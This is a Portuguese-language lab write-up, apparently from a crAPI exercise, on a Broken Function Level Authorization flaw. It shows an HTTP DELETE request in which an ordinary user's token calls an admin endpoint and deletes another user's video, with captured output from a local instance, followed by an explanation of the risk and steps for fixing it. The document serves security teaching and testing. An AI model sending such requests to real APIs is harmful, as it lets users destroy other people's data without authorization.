# BFLA — Usuário comum acessando função administrativa

**Categoria OWASP API Security Top 10 (2023):** `API5 — Broken Function Level Authorization`
**Severidade estimada:** `Alta`
**Desafio crAPI correspondente:** Challenge 7 — "delete a video of another user" (via endpoint de admin)

---

## 1. Resumo

Existe um endpoint **administrativo** (por exemplo, para deletar vídeos) que não verifica se quem chama tem papel de administrador. Um usuário comum, conhecendo ou adivinhando a rota de admin (estrutura REST previsível), executa uma função privilegiada — como apagar o vídeo de outro usuário.

## 2. Pré-condições

- Conta de **usuário comum** autenticada (sem privilégios de admin).
- O ID do recurso alvo (ex.: `video_id` de outro usuário).

## 3. Passo a passo da exploração

1. Como usuário comum, descubra a rota de admin a partir da rota de usuário. Se a rota do usuário é algo como `/identity/api/v2/user/videos/{id}`, a rota administrativa previsível é:

```http
DELETE /identity/api/v2/admin/videos/{video_id} HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token_de_usuario_comum>
```

2. Se a função executar com sucesso (ex.: vídeo de outro usuário deletado) usando um token **sem** papel de admin, a autorização em nível de função está quebrada.

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/06-bfla/captura.txt`](../../evidencias/06-bfla/captura.txt).

```
# token do atacante tem role comum:
GET /identity/api/v2/user/dashboard  ->  "role":"ROLE_USER"

# atacante (ROLE_USER) chama a função de admin sobre o vídeo da VÍTIMA:
DELETE /identity/api/v2/admin/videos/6
Authorization: Bearer <token_do_atacante>

HTTP 200
{"message":"User video deleted successfully.","status":200}
```

Após a chamada, o dashboard da vítima passou a mostrar `video_id: 0` (vídeo removido). Uma função administrativa foi executada por um usuário comum.

## 5. Por que é um risco

BFLA permite que usuários comuns executem **operações privilegiadas** — apagar dados de terceiros, acessar painéis de administração, alterar configurações. Diferente de BOLA (que é sobre *qual objeto* você acessa), BFLA é sobre *qual função* você pode executar. É comum quando a autorização de função é feita apenas escondendo a rota na interface, sem checagem de papel no servidor ("security by obscurity").

## 6. Como corrigir

- Verificar o **papel/permissão** do usuário no servidor para toda função sensível, de preferência via middleware central por grupo de rotas (ex.: tudo sob `/admin/` exige role de admin).
- Negar por padrão: funções administrativas inacessíveis a menos que explicitamente autorizadas.
- Não depender de esconder rotas na UI — a API deve recusar a chamada mesmo que a rota seja conhecida.

## 7. Referências

- [API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
